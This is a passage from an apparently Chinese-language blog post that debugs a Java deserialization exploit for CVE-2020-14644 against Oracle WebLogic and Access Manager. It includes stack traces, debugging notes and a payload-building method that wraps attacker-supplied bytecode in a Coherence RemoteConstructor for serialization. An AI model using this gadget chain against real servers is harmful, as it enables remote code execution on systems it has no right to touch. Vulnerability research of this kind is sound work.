</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-76-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-76-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-76-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-76-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-76-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-76-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-76-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-76-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-76-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-76-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-76-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-76-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-76-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-76-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-76-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-76-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-76-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-76-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-76-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-76-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-76-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-76-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-76-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-76-20>20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-76-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-76-21>21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-76-22><a style=outline:none;text-decoration:none;color:inherit href=#hl-76-22>22</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-76-23><a style=outline:none;text-decoration:none;color:inherit href=#hl-76-23>23</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-76-24><a style=outline:none;text-decoration:none;color:inherit href=#hl-76-24>24</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-76-25><a style=outline:none;text-decoration:none;color:inherit href=#hl-76-25>25</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-76-26><a style=outline:none;text-decoration:none;color:inherit href=#hl-76-26>26</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-76-27><a style=outline:none;text-decoration:none;color:inherit href=#hl-76-27>27</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>		at java.lang.ClassLoader.defineClass(ClassLoader.java:635)
</span></span><span style=display:flex><span>	at com.tangosol.internal.util.invoke.RemotableSupport.defineClass(RemotableSupport.java:181)
</span></span><span style=display:flex><span>	at com.tangosol.internal.util.invoke.RemotableSupport.realize(RemotableSupport.java:137)
</span></span><span style=display:flex><span>	at com.tangosol.internal.util.invoke.RemoteConstructor.newInstance(RemoteConstructor.java:122)
</span></span><span style=display:flex><span>	at com.tangosol.internal.util.invoke.RemoteConstructor.readResolve(RemoteConstructor.java:233)
</span></span><span style=display:flex><span>	
</span></span><span style=display:flex><span>	at com.tangosol.util.ExternalizableHelper.realize(ExternalizableHelper.java:4938)
</span></span><span style=display:flex><span>	at com.tangosol.util.ExternalizableHelper.readObject(ExternalizableHelper.java:2607)
</span></span><span style=display:flex><span>	at com.tangosol.util.ExternalizableHelper.readObject(ExternalizableHelper.java:2583)
</span></span><span style=display:flex><span>	
</span></span><span style=display:flex><span>	at com.tangosol.coherence.servlet.AttributeHolder.readExternal(AttributeHolder.java:407)
</span></span><span style=display:flex><span>	at com.tangosol.coherence.servlet.AttributeHolder.readExternal(AttributeHolder.java:372)
</span></span><span style=display:flex><span>	
</span></span><span style=display:flex><span>	at java.io.ObjectInputStream.readExternalData(ObjectInputStream.java:2234)
</span></span><span style=display:flex><span>	at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:2183)
</span></span><span style=display:flex><span>	at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1665)
</span></span><span style=display:flex><span>	at java.io.ObjectInputStream.readObject(ObjectInputStream.java:501)
</span></span><span style=display:flex><span>	at java.io.ObjectInputStream.readObject(ObjectInputStream.java:459)
</span></span><span style=display:flex><span>	at weblogic.rmi.provider.BasicServiceContext.readExternal(BasicServiceContext.java:56)
</span></span><span style=display:flex><span>	
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>at java.io.ObjectInputStream.readExternalData(ObjectInputStream.java:2234)
</span></span><span style=display:flex><span>	at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:2183)
</span></span><span style=display:flex><span>	at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1665)
</span></span><span style=display:flex><span>	at java.io.ObjectInputStream.readObject(ObjectInputStream.java:501)
</span></span><span style=display:flex><span>	at java.io.ObjectInputStream.readObject(ObjectInputStream.java:459)
</span></span><span style=display:flex><span>	at oracle.security.am.proxy.opensso.controller.OpenssoEngineController.unmarshal(OpenssoEngineController.java:2453)
</span></span></code></pre></td></tr></table></div></div><p>只在尝试 <code>com.tangosol.internal.util.invoke.RemoteConstructor.newInstance</code> 的时候找不到 <code>com.tangosol.internal.util.invoke.Remotable</code> 。</p><p>虽然报错是</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-77-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-77-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>java.lang.NoClassDefFoundError: com/tangosol/internal/util/invoke/Remotable
</span></span></code></pre></td></tr></table></div></div><p>但从生成payload的代码结合上面的错误堆栈来看，可能并不是没有找到 <code>com.tangosol.internal.util.invoke.Remotable</code> 这个类，而是在构建这个类的过程中，尝试通过字节码defineclass的时候出错了。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-78-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-78-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-78-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-78-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-78-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-78-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-78-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-78-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-78-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-78-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-78-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-78-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-78-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-78-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-78-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-78-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-78-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-78-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-78-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-78-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-78-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-78-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-78-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-78-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-78-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-78-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-78-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-78-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-78-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-78-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-78-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-78-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-78-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-78-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-78-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-78-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-78-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-78-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-78-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-78-20>20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-78-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-78-21>21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-78-22><a style=outline:none;text-decoration:none;color:inherit href=#hl-78-22>22</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-78-23><a style=outline:none;text-decoration:none;color:inherit href=#hl-78-23>23</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-78-24><a style=outline:none;text-decoration:none;color:inherit href=#hl-78-24>24</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-78-25><a style=outline:none;text-decoration:none;color:inherit href=#hl-78-25>25</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>cve_2020_14644_wrap</span><span style=color:#f92672>()</span> <span style=color:#66d9ef>throws</span> Exception <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        ClassIdentity classIdentity <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ClassIdentity<span style=color:#f92672>(</span>test6<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        ClassPool cp <span style=color:#f92672>=</span> ClassPool<span style=color:#f92672>.</span><span style=color:#a6e22e>getDefault</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        CtClass ctClass <span style=color:#f92672>=</span> cp<span style=color:#f92672>.</span><span style=color:#a6e22e>get</span><span style=color:#f92672>(</span>test6<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>.</span><span style=color:#a6e22e>getName</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>        ctClass<span style=color:#f92672>.</span><span style=color:#a6e22e>replaceClassName</span><span style=color:#f92672>(</span>test6<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>.</span><span style=color:#a6e22e>getName</span><span style=color:#f92672>(),</span> test6<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>.</span><span style=color:#a6e22e>getName</span><span style=color:#f92672>()</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;$&#34;</span> <span style=color:#f92672>+</span> classIdentity<span style=color:#f92672>.</span><span style=color:#a6e22e>getVersion</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>        System<span style=color:#f92672>.</span><span style=color:#a6e22e>out</span><span style=color:#f92672>.</span><span style=color:#a6e22e>println</span><span style=color:#f92672>(</span>ctClass<span style=color:#f92672>.</span><span style=color:#a6e22e>getName</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>        RemoteConstructor constructor <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> RemoteConstructor<span style=color:#f92672>(</span>
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>new</span> ClassDefinition<span style=color:#f92672>(</span>classIdentity<span style=color:#f92672>,</span> ctClass<span style=color:#f92672>.</span><span style=color:#a6e22e>toBytecode</span><span style=color:#f92672>()),</span>
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[]{}</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        AttributeHolder attributeHolder<span style=color:#f92672>=</span><span style=color:#66d9ef>new</span> AttributeHolder<span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        Method setInternalValue<span style=color:#f92672>=</span>attributeHolder<span style=color:#f92672>.</span><span style=color:#a6e22e>getClass</span><span style=color:#f92672>().</span><span style=color:#a6e22e>getDeclaredMethod</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;setInternalValue&#34;</span><span style=color:#f92672>,</span>Object<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        setInternalValue<span style=color:#f92672>.</span><span style=color:#a6e22e>setAccessible</span><span style=color:#f92672>(</span><span style=color:#66d9ef>true</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        setInternalValue<span style=color:#f92672>.</span><span style=color:#a6e22e>invoke</span><span style=color:#f92672>(</span>attributeHolder<span style=color:#f92672>,</span>constructor<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        BasicServiceContext basicServiceContext<span style=color:#f92672>=</span><span style=color:#66d9ef>new</span> BasicServiceContext<span style=color:#f92672>(</span><span style=color:#ae81ff>1</span><span style=color:#f92672>,</span>attributeHolder<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>//        String sobj = serialize(basicServiceContext);
</span></span></span><span style=display:flex><span><span style=color:#75715e>//        System.out.println(sobj);
</span></span></span><span style=display:flex><span><span style=color:#75715e>//        deserialize(sobj);
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#75715e>//        writeTextToClipboard(oamserialize(basicServiceContext));
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        System<span style=color:#f92672>.</span><span style=color:#a6e22e>out</span><span style=color:#f92672>.</span><span style=color:#a6e22e>println</span><span style=color:#f92672>(</span>oamserialize<span style=color:#f92672>(</span>basicServiceContext<span style=color:#f92672>));</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span></code></pre></td></tr></table></div></div><p>而且我们可以看到，gadgetchain中的前面几个类都已经被找到并且成功创建出来了。</p><p><img loading=lazy src=image-20220630211425221.png alt=image-20220630211425221></p><h4 id=排除字节码类名不匹配>排除字节码类名不匹配<a hidden class=anchor aria-hidden=true href=#排除字节码类名不匹配>#</a></h4><p>在 <code>com.tangosol.internal.util.invoke.RemotableSupport.realize</code> 下断点，最终会看到进64行后报错，而没有办法真正执行到69行去创建对象。</p><p><img loading=lazy src=image-20220324000537306.png alt=image-20220324000537306></p><p><img loading=lazy src=image-20220323232857649.png alt=image-20220323232857649></p><p><img loading=lazy src=image-20220323233030604.png alt=image-20220323233030604></p><p><img loading=lazy src=image-20220323233348219.png alt=image-20220323233348219></p><p>这里注意到文档说明</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-79-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-79-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-79-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-79-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-79-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-79-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-79-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-79-4>4</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>If name is not null, it must be equal to the binary name of the class specified by the byte array &#34;b&#34;, otherwise a NoClassDefFoundError will be thrown.
</span></span><span style=display:flex><span>......
</span></span><span style=display:flex><span>Throws:
</span></span><span style=display:flex><span>	NoClassDefFoundError – If name is not equal to the binary name of the class specified by b
</span></span></code></pre></td></tr></table></div></div><p>这个错误<code>NoClassDefFoundError</code> 和我们在log中看到的一模一样，很有可能是这个问题导致的。</p><p>再细看此时的参数状态，传入的类名是 <code>pers.neo.test$C5BD10F93D5F6E3E791935D6BFC036F5</code> 。</p><p><img loading=lazy src=image-20220323234043860.png alt=image-20220323234043860></p><p>看一下传入的requester参数中的序列化数据中的类名是什么？是 <code>pers/neo/test$C5BD10F93D5F6E3E791935D6BFC036F5</code></p><p><img loading=lazy src=image-20220323234856309.png alt=image-20220323234856309></p><p>一模一样，那么为什么呢？反反复复，继续在接下来这一行中报出错误：</p><p><img loading=lazy src=image-20220323234423502.png alt=image-20220323234423502></p><p>再跟入就是native代码了。</p><p><img loading=lazy src=image-20220323234456731.png alt=image-20220323234456731></p><p>会不会是字节码中的类名传入的参数的类名不一致导致的呢？尝试使用 <a href=https://www.class-visualizer.net/download.html>https://www.class-visualizer.net/download.html</a> 可视化test.class 类，看看是否因为idea直接编译导致的产生临时随机类名。</p><p>但调试可以看到类名是代码自己取出来处理过的，没有问题。</p><p><img loading=lazy src=image-20220324002454076.png alt=image-20220324002454076></p><p>这个将字节码中的类名进行替换（加上versionid）的动作是CVE-2020-14644所需要进行的正常操作，为了满足ClassIdentity所需要的特殊逻辑。</p><p><img loading=lazy src=image-20220324002915407.png alt=image-20220324002915407></p><p>如果不做改变的话反而会报类似下面这样的 wrong name 的错误</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-80-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-80-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span>Exception in thread <span style=color:#e6db74>&#34;main&#34;</span> java<span style=color:#f92672>.</span><span style=color:#a6e22e>lang</span><span style=color:#f92672>.</span><span style=color:#a6e22e>NoClassDefFoundError</span><span style=color:#f92672>:</span> pers<span style=color:#f92672>/</span>neo<span style=color:#f92672>/</span>test1$8CEAA052CA2629E7D4BAD619B2948F57 <span style=color:#f92672>(</span>wrong name<span style=color:#f92672>:</span> pers<span style=color:#f92672>/</span>neo<span style=color:#f92672>/</span>test1$5DF7AE1FE635F73F435EBEC61A76120B<span style=color:#f92672>)</span>
</span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=image-20220324004931718.png alt=image-20220324004931718></p><p>并且本地编译多次，确认 <code>classIdentity.getVersion()</code> 对于同一个类总是能拿到一样的version值。</p><p>至此排除是defineClass时候类名不一致导致的问题。</p><p>同时，我发现自己一直选择性忽略一个关键事实</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-81-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-81-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-81-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-81-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-81-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-81-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-81-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-81-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-81-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-81-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-81-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-81-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-81-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-81-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-81-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-81-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-81-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-81-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-81-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-81-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-81-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-81-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-81-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-81-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-81-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-81-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-81-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-81-14>14</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span>java.lang.NoClassDefFoundError: com/tangosol/internal/util/invoke/Remotable
</span></span><span style=display:flex><span>	at java.lang.ClassLoader.defineClass1(Native Method)
</span></span><span style=display:flex><span>	at java.lang.ClassLoader.defineClass(ClassLoader.java:756)
</span></span><span style=display:flex><span>	at java.lang.ClassLoader.defineClass(ClassLoader.java:635)
</span></span><span style=display:flex><span>	at com.tangosol.internal.util.invoke.RemotableSupport.defineClass(RemotableSupport.java:181)
</span></span><span style=display:flex><span>	at com.tangosol.internal.util.invoke.RemotableSupport.realize(RemotableSupport.java:137)
</span></span><span style=display:flex><span>	Truncated. see log file for complete stacktrace
</span></span><span style=display:flex><span>Caused By: java.lang.ClassNotFoundException: com.tangosol.internal.util.invoke.Remotable
</span></span><span style=display:flex><span>	at java.lang.ClassLoader.findClass(ClassLoader.java:523)
</span></span><span style=display:flex><span>	at java.lang.ClassLoader.loadClass(ClassLoader.java:418)
</span></span><span style=display:flex><span>	at java.lang.ClassLoader.loadClass(ClassLoader.java:351)
</span></span><span style=display:flex><span>	at java.lang.ClassLoader.defineClass1(Native Method)
</span></span><span style=display:flex><span>	at java.lang.ClassLoader.defineClass(ClassLoader.java:756)
</span></span><span style=display:flex><span>	Truncated. see log file for complete stacktrace
</span></span></code></pre></td></tr></table></div></div><p>在这个报错中， <code>java.lang.NoClassDefFoundError</code> 是由 <code>ClassNotFoundException</code> 引起的。 所以本质上是因为 <code>com.tangosol.internal.util.invoke.Remotable</code> 找不到，而不是<code>pers.neo.test1$8CEAA052CA2629E7D4BAD619B2948F57</code> 不对。如果我看得够认真，思考得足够慢，一早该发现这一点。</p><h4 id=本地defineclass-demo调试>本地defineClass demo调试<a hidden class=anchor aria-hidden=true href=#本地defineclass-demo调试>#</a></h4><p>为了理清楚到底是defineClass的那个环节造成的报错，我本地写了个defineClass的demo并调试（名叫definecls），然后在这两种异常下断点，终于看到了更真相的一幕。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-82-1><a 